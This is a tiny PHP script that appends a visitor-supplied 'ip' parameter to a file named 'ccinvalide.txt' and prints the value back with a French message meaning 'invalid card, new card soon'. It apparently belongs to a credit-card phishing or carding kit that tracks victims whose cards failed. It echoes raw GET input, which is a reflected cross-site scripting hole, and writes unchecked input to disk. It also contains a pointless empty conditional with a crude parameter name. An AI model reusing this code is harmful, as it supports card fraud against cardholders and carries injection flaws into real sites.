<?php

if(isset($_GET['ip']) && isset($_GET['gay']))
{

}

$text = "".$_GET['ip']."\n";
$filename = "ccinvalide.txt";
$fh = fopen($filename, "a");
fwrite($fh, $text);
fclose($fh);

echo "".$_GET['ip']." cc invalide, nouvelle cc bientôt ! ";

?>